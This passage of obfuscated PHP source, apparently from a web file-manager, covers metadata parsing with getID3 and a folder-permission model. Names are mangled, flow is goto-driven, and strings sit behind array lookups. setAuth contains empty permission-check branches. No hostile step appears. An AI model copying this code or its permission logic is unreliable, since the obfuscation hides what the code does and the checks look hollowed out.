strpos($EÖÖ»É¾ ¶, $Cí¤º½êÁ[922], $eâ¥ğôô«))) { $eâ¥ğôô« = $e­İ»ì´‚Â + 1; } } break; default: if ($Cí¤º½êÁ[1567] == substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 6)) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[1567]; $eâ¥ğôô« += 6; } elseif ($Cí¤º½êÁ[101] == substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 4)) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[101]; $eâ¥ğôô« += 4; $aÍöâŒÄœê = $Cí¤º½êÁ[101]; } elseif ($Cí¤º½êÁ[1568] == substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 4)) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[1569]; $eâ¥ğôô« += 4; $aÍöâŒÄœê = $Cí¤º½êÁ[1568]; } elseif ($Cí¤º½êÁ[1570] == substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 5)) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[1569]; $eâ¥ğôô« += 5; $aÍöâŒÄœê = $Cí¤º½êÁ[1570]; } elseif ($Cí¤º½êÁ[1571] == substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 6)) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[1571]; $eâ¥ğôô« += 6; if (1 == preg_match($Cí¤º½êÁ[1572], substr($EÖÖ»É¾ ¶, $eâ¥ğôô«), $c˜Õ¯´ĞøŸ)) { $eâ¥ğôô« += strlen($c˜Õ¯´ĞøŸ[0]); $E®ÀÅŒˆÌÔ = $Cí¤º½êÁ[1573]; $Dˆß¶ó‡ÂÃ = preg_match($E®ÀÅŒˆÌÔ, substr($EÖÖ»É¾ ¶, $eâ¥ğôô«), $c˜Õ¯´ĞøŸ, PREG_OFFSET_CAPTURE); if (1 == $Dˆß¶ó‡ÂÃ) { $aÍöâŒÄœê = substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, $c˜Õ¯´ĞøŸ[0][1]); $eâ¥ğôô« += $c˜Õ¯´ĞøŸ[1][1]; } } } elseif ($Cí¤º½êÁ[1574] == substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 9)) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[1574]; $eâ¥ğôô« += 9; } elseif (1 == preg_match($Cí¤º½êÁ[1575], substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 33), $c˜Õ¯´ĞøŸ)) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[1537]; $eâ¥ğôô« += strlen($c˜Õ¯´ĞøŸ[0]); $aÍöâŒÄœê = intval($c˜Õ¯´ĞøŸ[1]) . $Cí¤º½êÁ[70] . intval($c˜Õ¯´ĞøŸ[2]); } elseif (1 == preg_match($Cí¤º½êÁ[1576], substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 33), $c˜Õ¯´ĞøŸ)) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[1577]; $aÍöâŒÄœê = intval($c˜Õ¯´ĞøŸ[1]) . $Cí¤º½êÁ[70] . intval($c˜Õ¯´ĞøŸ[2]); $eâ¥ğôô« += strlen($c˜Õ¯´ĞøŸ[0]); } elseif (($fğÀàêåŠ¤ = strspn($EÖÖ»É¾ ¶, $Cí¤º½êÁ[1578], $eâ¥ğôô«)) > 0) { $f‰“ôå¨í¼ = $Cí¤º½êÁ[1579]; $aÍöâŒÄœê = substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, $fğÀàêåŠ¤); $eâ¥ğôô« += $fğÀàêåŠ¤; } break; } goto A©‰ë¹ãõö; CÍÌÅĞÏ«Ÿ: $Cí¤º½êÁ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f‰“ôå¨í¼ = $Cí¤º½êÁ[33]; $aÍöâŒÄœê = $Cí¤º½êÁ[33]; goto EäÖõ¤©÷; A©‰ë¹ãõö: return array($f‰“ôå¨í¼, $aÍöâŒÄœê, $eâ¥ğôô«); goto eš â¡¶; eš â¡¶: } } class GetInfo { private static $fileTypeArray; public static function get($DˆøÊ›¬ËÜ) { $B–„ƒ¿„Ô = IO::info($DˆøÊ›¬ËÜ); return self::infoAdd($B–„ƒ¿„Ô); } public static function infoAdd(&$dáè©ÄëÒ‰) { goto e»’Ì™™˜†; B¤¸ôÒ§ĞÅ: $e“Úæö°æ = $dáè©ÄëÒ‰[$BîÆ½‚ØÜš[157]]; try { if ($dáè©ÄëÒ‰[$BîÆ½‚ØÜš[157]] == $BîÆ½‚ØÜš[1582]) { $D”¤é¥Òå± = self::psdParse($e›»ÇâÈİ¥); $e“Úæö°æ = $BîÆ½‚ØÜš[1583]; } else { if ($dáè©ÄëÒ‰[$BîÆ½‚ØÜš[157]] == $BîÆ½‚ØÜš[1584]) { $D”¤é¥Òå± = self::pdfParse($e›»ÇâÈİ¥); } else { $e“Úæö°æ = self::$fileTypeArray[$BîÆ½‚ØÜš[1585]][$dáè©ÄëÒ‰[$BîÆ½‚ØÜš[157]]]; $C±Û´ëÓ = self::$fileTypeArray[$BîÆ½‚ØÜš[1586]][$e“Úæö°æ][$BîÆ½‚ØÜš[1587]]; $cÜå‹©¥ß¥ = @$dñ²‰£˜¢Ã->analyze($e›»ÇâÈİ¥, $dáè©ÄëÒ‰[$BîÆ½‚ØÜš[77]], $dáè©ÄëÒ‰[$BîÆ½‚ØÜš[28]]); $D”¤é¥Òå± = self::parseData($cÜå‹©¥ß¥, $C±Û´ëÓ, $dáè©ÄëÒ‰); } } } catch (Exception $b¸‚³ôö›¥) { $D”¤é¥Òå± = array($BîÆ½‚ØÜš[369] => $e“Úæö°æ); } if (!$D”¤é¥Òå±) { return; } goto BÃ“ê¡×ŠÍ; dÍÃŒ«âİ”: if (!$dáè©ÄëÒ‰ || $dáè©ÄëÒ‰[$BîÆ½‚ØÜš[29]] != $BîÆ½‚ØÜš[164]) { return; } if (!self::support($dáè©ÄëÒ‰[$BîÆ½‚ØÜš[157]]) || isset($dáè©ÄëÒ‰[$BîÆ½‚ØÜš[422]])) { return; } $e›»ÇâÈİ¥ = $BîÆ½‚ØÜš[1581] . $dáè©ÄëÒ‰[$BîÆ½‚ØÜš[75]]; goto B¤¸ôÒ§ĞÅ; e»’Ì™™˜†: $BîÆ½‚ØÜš =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; static $dñ²‰£˜¢Ã; if (!$dñ²‰£˜¢Ã) { require SDK_DIR . $BîÆ½‚ØÜš[1580]; $dñ²‰£˜¢Ã = new getID3(); } goto dÍÃŒ«âİ”; BÃ“ê¡×ŠÍ: $D”¤é¥Òå±[$BîÆ½‚ØÜš[369]] = $e“Úæö°æ; $dáè©ÄëÒ‰[$BîÆ½‚ØÜš[422]] = $D”¤é¥Òå±; return $dáè©ÄëÒ‰; goto D’ğÏÍ£°ö; D’ğÏÍ£°ö: } public static function support($cñ‹á˜…ì›) { goto fÏèŞ°Ö¿Ï; FèØŠ§ª²: $FÕÃ¼¶ßŞè = array($câ¾ÚéòµÈ[1584], $câ¾ÚéòµÈ[1582]); if (in_array($cñ‹á˜…ì›, $FÕÃ¼¶ßŞè)) { return !0; } if (isset(self::$fileTypeArray[$câ¾ÚéòµÈ[1585]][$cñ‹á˜…ì›])) { return !0; } goto fˆÏ¬šİÖ; fÏèŞ°Ö¿Ï: $câ¾ÚéòµÈ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $cñ‹á˜…ì› = strtolower($cñ‹á˜…ì›); goto FèØŠ§ª²; fˆÏ¬šİÖ: return !1; goto B¡õ‡²»›ê; B¡õ‡²»›ê: } private static function parseData($d«»˜İ÷Ñ, $D½‰…öïÛ, $aàÀ×ô½Îª) { $F–ÊÜÁ©¹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F¼§ƒ›ÓÁö = $d«»˜İ÷Ñ[$F–ÊÜÁ©¹[1588]]; $fã•¾£ÎÇæ = array(); foreach ($D½‰…öïÛ as $fö¼ÛßÌŸ¼ => $BÈšÆ”åğî) { foreach ($BÈšÆ”åğî as $DÊĞÄÚæŠï) { if (is_array($DÊĞÄÚæŠï)) { $aŠ¥¶ƒÕ…Î = self::parseData($d«»˜İ÷Ñ, $BÈšÆ”åğî, $aàÀ×ô½Îª); if ($aŠ¥¶ƒÕ…Î) { $fã•¾£ÎÇæ[$fö¼ÛßÌŸ¼] = $aŠ¥¶ƒÕ…Î; } break; } $b‹ñˆ§óÄ = str_replace($F–ÊÜÁ©¹[1362], $F¼§ƒ›ÓÁö, $DÊĞÄÚæŠï); $aŠ¥¶ƒÕ…Î = _get($d«»˜İ÷Ñ, $b‹ñˆ§óÄ); $aŠ¥¶ƒÕ…Î = is_array($aŠ¥¶ƒÕ…Î) ? $aŠ¥¶ƒÕ…Î[0] : $aŠ¥¶ƒÕ…Î; if ($aŠ¥¶ƒÕ…Î) { break; } } if ($aŠ¥¶ƒÕ…Î || $aŠ¥¶ƒÕ…Î === 0 || $aŠ¥¶ƒÕ…Î === !1) { $aŠ¥¶ƒÕ…Î = self::valueReset($DÊĞÄÚæŠï, $aŠ¥¶ƒÕ…Î, $fö¼ÛßÌŸ¼); if ($aŠ¥¶ƒÕ…Î !== null) { $fã•¾£ÎÇæ[$fö¼ÛßÌŸ¼] = $aŠ¥¶ƒÕ…Î; } } } $fã•¾£ÎÇæ = self::valueResetAll($fã•¾£ÎÇæ, $aàÀ×ô½Îª); return $fã•¾£ÎÇæ; } private static function psdParse($CğéË£‘‚) { $Bİ‘—‰î÷Ş =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (IO::fileSubstr($CğéË£‘‚, 0, 4) != $Bİ‘—‰î÷Ş[1589]) { return !1; } $BáÅÎ†—¹ö = getImageSize($CğéË£‘‚, $Cà”Şƒ˜“ß); if (!$BáÅÎ†—¹ö) { return; } $Dæà”ƒ©­õ = array($Bİ‘—‰î÷Ş[1504] => $BáÅÎ†—¹ö[0], $Bİ‘—‰î÷Ş[1506] => $BáÅÎ†—¹ö[1]); return $Dæà”ƒ©­õ; } private static function pdfParse($a†˜Ğ±´‹) { return FileParsePdf::parse($a†˜Ğ±´‹); } private static function fileTypeParse() { $eµŞ·øğä» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cµ¼«Ä²»ñ = self::fileTypeArray(); $eÈ»§£Ù—™ = array(); foreach ($cµ¼«Ä²»ñ as $a©Õéğœ => $FçŸ¢š±¬Ü) { $e“’¶‹ğ¡ä = _get($FçŸ¢š±¬Ü, $eµŞ·øğä»[157], $eµŞ·øğä»[33]); $cé‚ç®±¼â = is_string($e“’¶‹ğ¡ä) ? explode($eµŞ·øğä»[47], $e“’¶‹ğ¡ä) : $e“’¶‹ğ¡ä; if (!$cé‚ç®±¼â) { continue; } foreach ($cé‚ç®±¼â as $e“’¶‹ğ¡ä) { $e“’¶‹ğ¡ä = strtolower(trim($e“’¶‹ğ¡ä)); if (!$e“’¶‹ğ¡ä) { continue; } $eÈ»§£Ù—™[$e“’¶‹ğ¡ä] = $a©Õéğœ; } $cµ¼«Ä²»ñ[$a©Õéğœ][$eµŞ·øğä»[157]] = array_keys($eÈ»§£Ù—™); $cµ¼«Ä²»ñ[$a©Õéğœ][$eµŞ·øğä»[1587]] = self::parseKeyMap($FçŸ¢š±¬Ü[$eµŞ·øğä»[1587]]); } return array($eµŞ·øğä»[1586] => $cµ¼«Ä²»ñ, $eµŞ·øğä»[1585] => $eÈ»§£Ù—™); } private static function parseKeyMap($DÖÀ¿™Ü¡) { $f¢—¡ÌÀÆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($DÖÀ¿™Ü¡ as $F¶¨Á‡¡Š => $E®¼†ª²ÚŸ) { if (is_array($E®¼†ª²ÚŸ)) { $f“¤ŞäÄç = self::parseKeyMap($E®¼†ª²ÚŸ); if ($f“¤ŞäÄç) { $DÖÀ¿™Ü¡[$F¶¨Á‡¡Š] = $f“¤ŞäÄç; } continue; } $cˆ¬•àÙÊ¸ = explode($f¢—¡ÌÀÆ[47], $E®¼†ª²ÚŸ); $eˆª¿ƒÅæ· = array(); foreach ($cˆ¬•àÙÊ¸ as $eÍ¥‹ÒõŠÖ) { $eÍ¥‹ÒõŠÖ = trim($eÍ¥‹ÒõŠÖ); if (!$eÍ¥‹ÒõŠÖ) { continue; } if (preg_match($f¢—¡ÌÀÆ[1590], $eÍ¥‹ÒõŠÖ, $aãƒ¿¡íÊê)) { $eŒˆÕìÖ… = explode($f¢—¡ÌÀÆ[268], $aãƒ¿¡íÊê[1]); foreach ($eŒˆÕìÖ… as $c‚—”ê§‚) { $eˆª¿ƒÅæ·[] = str_replace($aãƒ¿¡íÊê[0], $c‚—”ê§‚, $eÍ¥‹ÒõŠÖ); } } else { $eˆª¿ƒÅæ·[] = $eÍ¥‹ÒõŠÖ; } } $DÖÀ¿™Ü¡[$F¶¨Á‡¡Š] = $eˆª¿ƒÅæ·; } return $DÖÀ¿™Ü¡; } private static function valueResetAll($BŠ¢àÉÆŞ, $f¥“–©Àæ) { goto bíÕŒ•Éˆ; Dæ‹÷ä‡ÓÁ: if ($CÕÁîé’õ) { $cí‰Èİ¾Ş = IO_PATH_SYSTEM_TEMP . $d…¹ñÙ•‰ê[1596] . KodIO::hashPath($f¥“–©Àæ) . $d…¹ñÙ•‰ê[1597]; $BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1598]] = Action($d…¹ñÙ•‰ê[1599])->pluginCacheFileSet($cí‰Èİ¾Ş, $CÕÁîé’õ); unset($BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1600]][$d…¹ñÙ•‰ê[1583]]); } $f™âã³¨É³ = _get($BŠ¢àÉÆŞ, $d…¹ñÙ•‰ê[1601], $d…¹ñÙ•‰ê[33]); $A‚•ƒÄ´Æ¶ = _get($BŠ¢àÉÆŞ, $d…¹ñÙ•‰ê[1602], $d…¹ñÙ•‰ê[33]); goto dä¼¥Ò‰Ó; dä¼¥Ò‰Ó: $B÷œÙôŸƒ = _get($BŠ¢àÉÆŞ, $d…¹ñÙ•‰ê[1603], $d…¹ñÙ•‰ê[33]); $E®îñ««È = $f™âã³¨É³ . $A‚•ƒÄ´Æ¶ . $B÷œÙôŸƒ; if ($E®îñ««È && get_charset($E®îñ««È) != $d…¹ñÙ•‰ê[323]) { $BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1600]][$d…¹ñÙ•‰ê[1316]] = iconv_to($BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1600]][$d…¹ñÙ•‰ê[1316]], get_charset($E®îñ««È), $d…¹ñÙ•‰ê[323]); $BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1600]][$d…¹ñÙ•‰ê[1604]] = iconv_to($BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1600]][$d…¹ñÙ•‰ê[1604]], get_charset($E®îñ««È), $d…¹ñÙ•‰ê[323]); $BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1600]][$d…¹ñÙ•‰ê[1605]] = iconv_to($BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1600]][$d…¹ñÙ•‰ê[1605]], get_charset($E®îñ««È), $d…¹ñÙ•‰ê[323]); } goto f«è½Š™Ã; f«è½Š™Ã: return $BŠ¢àÉÆŞ; goto A¯¬ñÅğ§‘; bíÕŒ•Éˆ: $d…¹ñÙ•‰ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1591]])) { $AÃë¤‚ìºæ = ceil($BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1591]]); $cìŒ ÎªãÑ = intval($AÃë¤‚ìºæ / 3600); $dÛ¡á½¼Ù = intval(($AÃë¤‚ìºæ - $cìŒ ÎªãÑ * 3600) / 60); $fáÀæ‹œ¬ = $AÃë¤‚ìºæ % 60; $BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1592]] = sprintf($d…¹ñÙ•‰ê[1593], $cìŒ ÎªãÑ, $dÛ¡á½¼Ù, $fáÀæ‹œ¬); if ($cìŒ ÎªãÑ == 0) { $BŠ¢àÉÆŞ[$d…¹ñÙ•‰ê[1592]] = sprintf($d…¹ñÙ•‰ê[1594], $dÛ¡á½¼Ù, $fáÀæ‹œ¬); } } $CÕÁîé’õ = _get($BŠ¢àÉÆŞ, $d…¹ñÙ•‰ê[1595]); goto Dæ‹÷ä‡ÓÁ; A¯¬ñÅğ§‘: } private static function valueReset($Eİ…å‚ä¶İ, $d‡ê¡µùöÁ, $E†Ûé²†­ë) { $C¦³ŒÙè…² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bœÛ •ğŞ° = $C¦³ŒÙè…²[1521]; switch ($Eİ…å‚ä¶İ) { case $C¦³ŒÙè…²[1606]: $d‡ê¡µùöÁ = $d‡ê¡µùöÁ == $C¦³ŒÙè…²[83] ? $C¦³ŒÙè…²[1607] : $C¦³ŒÙè…²[1608]; break; case $C¦³ŒÙè…²[1609]: $d‡ê¡µùöÁ = $d‡ê¡µùöÁ ? $d‡ê¡µùöÁ : null; break; default: break; } switch ($E†Ûé²†­ë) { case $C¦³ŒÙè…²[1610]: $d‡ê¡µùöÁ = round($d‡ê¡µùöÁ, 2); break; case $C¦³ŒÙè…²[184]: case $C¦³ŒÙè…²[107]: if ($d‡ê¡µùöÁ < 0) { $d‡ê¡µùöÁ = null; } else { if (is_numeric($d‡ê¡µùöÁ)) { $d‡ê¡µùöÁ = date($bœÛ •ğŞ°, $d‡ê¡µùöÁ); } } break; default: break; } return $d‡ê¡µùöÁ; } private static function fileTypeArray() { $c÷„Ÿ¾Å‹â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($c÷„Ÿ¾Å‹â[1583] => array($c÷„Ÿ¾Å‹â[157] => $c÷„Ÿ¾Å‹â[1611] . $c÷„Ÿ¾Å‹â[1612], $c÷„Ÿ¾Å‹â[1587] => array($c÷„Ÿ¾Å‹â[1504] => $c÷„Ÿ¾Å‹â[1613], $c÷„Ÿ¾Å‹â[1506] => $c÷„Ÿ¾Å‹â[1614], $c÷„Ÿ¾Å‹â[1615] => $c÷„Ÿ¾Å‹â[1616], $c÷„Ÿ¾Å‹â[1617] => $c÷„Ÿ¾Å‹â[1618], $c÷„Ÿ¾Å‹â[184] => $c÷„Ÿ¾Å‹â[1619], $c÷„Ÿ¾Å‹â[107] => $c÷„Ÿ¾Å‹â[1620], $c÷„Ÿ¾Å‹â[1621] => $c÷„Ÿ¾Å‹â[1622], $c÷„Ÿ¾Å‹â[1623] => $c÷„Ÿ¾Å‹â[1624], $c÷„Ÿ¾Å‹â[1625] => $c÷„Ÿ¾Å‹â[1626], $c÷„Ÿ¾Å‹â[1627] => $c÷„Ÿ¾Å‹â[1628], $c÷„Ÿ¾Å‹â[1629] => $c÷„Ÿ¾Å‹â[1630], $c÷„Ÿ¾Å‹â[1631] => $c÷„Ÿ¾Å‹â[1632], $c÷„Ÿ¾Å‹â[1633] => $c÷„Ÿ¾Å‹â[1634], $c÷„Ÿ¾Å‹â[1635] => array($c÷„Ÿ¾Å‹â[1636] => $c÷„Ÿ¾Å‹â[1637], $c÷„Ÿ¾Å‹â[1638] => $c÷„Ÿ¾Å‹â[1639], $c÷„Ÿ¾Å‹â[1640] => $c÷„Ÿ¾Å‹â[1641]), $c÷„Ÿ¾Å‹â[1642] => $c÷„Ÿ¾Å‹â[1643], $c÷„Ÿ¾Å‹â[1644] => $c÷„Ÿ¾Å‹â[1645], $c÷„Ÿ¾Å‹â[1646] => $c÷„Ÿ¾Å‹â[1647], $c÷„Ÿ¾Å‹â[1648] => $c÷„Ÿ¾Å‹â[1649], $c÷„Ÿ¾Å‹â[1650] => array($c÷„Ÿ¾Å‹â[1651] => $c÷„Ÿ¾Å‹â[1652], $c÷„Ÿ¾Å‹â[1653] => $c÷„Ÿ¾Å‹â[1654], $c÷„Ÿ¾Å‹â[1655] => $c÷„Ÿ¾Å‹â[1656], $c÷„Ÿ¾Å‹â[1657] => $c÷„Ÿ¾Å‹â[1658], $c÷„Ÿ¾Å‹â[1659] => $c÷„Ÿ¾Å‹â[1660], $c÷„Ÿ¾Å‹â[1661] => $c÷„Ÿ¾Å‹â[1662], $c÷„Ÿ¾Å‹â[1663] => $c÷„Ÿ¾Å‹â[1664], $c÷„Ÿ¾Å‹â[1665] => $c÷„Ÿ¾Å‹â[1666], $c÷„Ÿ¾Å‹â[1667] => $c÷„Ÿ¾Å‹â[1668], $c÷„Ÿ¾Å‹â[1669] => $c÷„Ÿ¾Å‹â[1670], $c÷„Ÿ¾Å‹â[1671] => $c÷„Ÿ¾Å‹â[1672]))), $c÷„Ÿ¾Å‹â[1673] => array($c÷„Ÿ¾Å‹â[157] => $c÷„Ÿ¾Å‹â[1674] . $c÷„Ÿ¾Å‹â[1675], $c÷„Ÿ¾Å‹â[1587] => array($c÷„Ÿ¾Å‹â[1591] => $c÷„Ÿ¾Å‹â[1676], $c÷„Ÿ¾Å‹â[184] => $c÷„Ÿ¾Å‹â[1677], $c÷„Ÿ¾Å‹â[107] => $c÷„Ÿ¾Å‹â[1678], $c÷„Ÿ¾Å‹â[1623] => $c÷„Ÿ¾Å‹â[1679], $c÷„Ÿ¾Å‹â[1680] => $c÷„Ÿ¾Å‹â[1681], $c÷„Ÿ¾Å‹â[1682] => $c÷„Ÿ¾Å‹â[1609], $c÷„Ÿ¾Å‹â[1683] => $c÷„Ÿ¾Å‹â[1684], $c÷„Ÿ¾Å‹â[1685] => $c÷„Ÿ¾Å‹â[1686], $c÷„Ÿ¾Å‹â[1687] => $c÷„Ÿ¾Å‹â[1688], $c÷„Ÿ¾Å‹â[1600] => array($c÷„Ÿ¾Å‹â[1316] => $c÷„Ÿ¾Å‹â[1689], $c÷„Ÿ¾Å‹â[1604] => $c÷„Ÿ¾Å‹â[1690], $c÷„Ÿ¾Å‹â[1605] => $c÷„Ÿ¾Å‹â[1691], $c÷„Ÿ¾Å‹â[1692] => $c÷„Ÿ¾Å‹â[1693], $c÷„Ÿ¾Å‹â[1694] => $c÷„Ÿ¾Å‹â[1695], $c÷„Ÿ¾Å‹â[1696] => $c÷„Ÿ¾Å‹â[1697], $c÷„Ÿ¾Å‹â[1583] => $c÷„Ÿ¾Å‹â[1698]))), $c÷„Ÿ¾Å‹â[1699] => array($c÷„Ÿ¾Å‹â[157] => $c÷„Ÿ¾Å‹â[1700] . $c÷„Ÿ¾Å‹â[1701], $c÷„Ÿ¾Å‹â[1587] => array($c÷„Ÿ¾Å‹â[1504] => $c÷„Ÿ¾Å‹â[1702], $c÷„Ÿ¾Å‹â[1506] => $c÷„Ÿ¾Å‹â[1703], $c÷„Ÿ¾Å‹â[1591] => $c÷„Ÿ¾Å‹â[1676], $c÷„Ÿ¾Å‹â[184] => $c÷„Ÿ¾Å‹â[1704], $c÷„Ÿ¾Å‹â[107] => $c÷„Ÿ¾Å‹â[1705], $c÷„Ÿ¾Å‹â[1610] => $c÷„Ÿ¾Å‹â[1706], $c÷„Ÿ¾Å‹â[1687] => $c÷„Ÿ¾Å‹â[1707], $c÷„Ÿ¾Å‹â[1683] => $c÷„Ÿ¾Å‹â[1708], $c÷„Ÿ¾Å‹â[1623] => $c÷„Ÿ¾Å‹â[1709], $c÷„Ÿ¾Å‹â[1673] => array($c÷„Ÿ¾Å‹â[1682] => $c÷„Ÿ¾Å‹â[1609], $c÷„Ÿ¾Å‹â[1710] => $c÷„Ÿ¾Å‹â[1711], $c÷„Ÿ¾Å‹â[1680] => $c÷„Ÿ¾Å‹â[1681], $c÷„Ÿ¾Å‹â[1687] => $c÷„Ÿ¾Å‹â[1688], $c÷„Ÿ¾Å‹â[1683] => $c÷„Ÿ¾Å‹â[1712], $c÷„Ÿ¾Å‹â[1685] => $c÷„Ÿ¾Å‹â[1686]))), $c÷„Ÿ¾Å‹â[1713] => array($c÷„Ÿ¾Å‹â[1587] => array($c÷„Ÿ¾Å‹â[1714] => $c÷„Ÿ¾Å‹â[1715], $c÷„Ÿ¾Å‹â[1716] => $c÷„Ÿ¾Å‹â[1717])), $c÷„Ÿ¾Å‹â[1718] => array($c÷„Ÿ¾Å‹â[1587] => array())); } } goto b©Û“§»îÂ; b÷ÁŒÛÁô¤: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\162\143\145\x5f\x61\x75\164\150"; public function getAuth($d×½—ìºˆÌ) { goto A†›¥íÇ×Æ; A†›¥íÇ×Æ: $BÎİ¤‡©Ì¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b ­›ì¸¢ˆ = $BÎİ¤‡©Ì¤[2218]; $CÙè¦í’¶ = array($BÎİ¤‡©Ì¤[366] => $d×½—ìºˆÌ); goto EùÕ’÷÷ˆ; EùÕ’÷÷ˆ: $fŒÄÈùŞº = $this->field($b ­›ì¸¢ˆ)->order($BÎİ¤‡©Ì¤[364])->where($CÙè¦í’¶)->select(); $Dï¾“‚Ü¬Ë = array(); foreach ($fŒÄÈùŞº as $cù¢ª¢À–º) { if (Model($BÎİ¤‡©Ì¤[2219])->listData($cù¢ª¢À–º[$BÎİ¤‡©Ì¤[2200]])) { $Dï¾“‚Ü¬Ë[] = $cù¢ª¢À–º; } } goto F¨Ù®©ŠğÈ; F¨Ù®©ŠğÈ: return $Dï¾“‚Ü¬Ë; goto b¼¥¯Ú¹Ó; b¼¥¯Ú¹Ó: } public function setAuth($F’äñÙ— •, $a§ÔàŒÎ›) { goto CÆ†³åº‡Î; CÆ†³åº‡Î: $a†’ä‘¢·´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d­æ¨Ğåß³ = Model($a†’ä‘¢·´[1102])->sourceInfo($F’äñÙ— •); if ($d­æ¨Ğåß³[$a†’ä‘¢·´[368]] != SourceModel::TYPE_GROUP) { return !1; } goto aÒ®Šïåâ¼; aÒ®Šïåâ¼: $eòË‡åÕ…½ = 1; $dÊ‹À‘¾‡ö = $d­æ¨Ğåß³[$a†’ä‘¢·´[452]]; if ($dÊ‹À‘¾‡ö != $eòË‡åÕ…½) { $BŸ¼ä–„Ÿ = array($a†’ä‘¢·´[2072] => $dÊ‹À‘¾‡ö); $aÌÍ¤ï±ä× = Model($a†’ä‘¢·´[2146])->field($a†’ä‘¢·´[1409])->where($BŸ¼ä–„Ÿ)->select(); $aÌÍ¤ï±ä× = array_to_keyvalue($aÌÍ¤ï±ä×, $a†’ä‘¢·´[33], $a†’ä‘¢·´[1409]); } goto Dó–¢ÀÑö; Dó–¢ÀÑö: $b¥‡¡Ş = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $B°ôãÏßˆÉ = array(); foreach ($a§ÔàŒÎ› as $EƒÔ„›ËïŞ) { if (!in_array($EƒÔ„›ËïŞ[$a†’ä‘¢·´[368]], $b¥‡¡Ş)) { show_json(LNG($a†’ä‘¢·´[2220]), !1); } if ($dÊ‹À‘¾‡ö != $eòË‡åÕ…½) { if ($EƒÔ„›ËïŞ[$a†’ä‘¢·´[368]] == SourceModel::TYPE_GROUP) { } if ($EƒÔ„›ËïŞ[$a†’ä‘¢·´[452]] != 0 && !in_array($EƒÔ„›ËïŞ[$a†’ä‘¢·´[452]], $aÌÍ¤ï±ä×)) { } } if ($EƒÔ„›ËïŞ[$a†’ä‘¢·´[452]] == 0) { $EƒÔ„›ËïŞ[$a†’ä‘¢·´[368]] = SourceModel::TYPE_USER; } $B°ôãÏßˆÉ[] = array($a†’ä‘¢·´[366] => $F’äñÙ— •, $a†’ä‘¢·´[368] => intval($EƒÔ„›ËïŞ[$a†’ä‘¢·´[368]]), $a†’ä‘¢·´[452] => intval($EƒÔ„›ËïŞ[$a†’ä‘¢·´[452]]), $a†’ä‘¢·´[2200] => intval($EƒÔ„›ËïŞ[$a†’ä‘¢·´[2200]]) ? intval($EƒÔ„›ËïŞ[$a†’ä‘¢·´[2200]]) : 0, $a†’ä‘¢·´[2201] => intval($EƒÔ„›ËïŞ[$a†’ä‘¢·´[2201]]) ? intval($EƒÔ„›ËïŞ[$a†’ä‘¢·´[2201]]) : -1); } goto AÖšŠˆ­­£; AÖšŠˆ­­£: $this->where(array($a†’ä‘¢·´[380] => $F’äñÙ— •))->delete(); $this->addAll($B°ôãÏßˆÉ); return !0; goto aç‹°›Æéƒ; aç‹°›Æéƒ: } public function authClear($bİ‡íÅ³¾) { $a®²…Ú½‘à =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÆ–ëàÏ­ = Model($a®²…Ú½‘à[1102])->sourceInfo($bİ‡íÅ³¾); $eâ‹æé²£ = array($bİ‡íÅ³¾); if ($FÆ–ëàÏ­[$a®²…Ú½‘à[367]] == $a®²…Ú½‘à[83]) { $Eáó–áÉ©Ğ = array($a®²…Ú½‘à[521] => array($a®²…Ú½‘à[479], $FÆ–ëàÏ­[$a®²…Ú½‘à[455]] . $bİ‡íÅ³¾ . $a®²…Ú½‘à[480])); $eâ‹æé²£ = Model($a®²…Ú½‘à[1102])->field($a®²…Ú½‘à[380])->where($Eáó–áÉ©Ğ)->getField($a®²…Ú½‘à[366], !0); $eâ‹æé²£[] = $bİ‡íÅ³¾; } $this->where(array($a®²…Ú½‘à[380] => array($a®²…Ú½‘à[381], $eâ‹æé²£)))->delete(); return !0; } public function get($Fë³ø·µ•·) { $cÂäî’ÇŸ = $this->getSourceList(array($Fë³ø·µ•·), !0); return $cÂäî’ÇŸ[0]; } public function getSourceList($F‘ô®›Û §, $Bœ÷Á–‡éš = false) { goto fÉ˜¥¿·ÎŠ; b¤†·—ã„‘: if (!$Bœ÷Á–‡éš) { 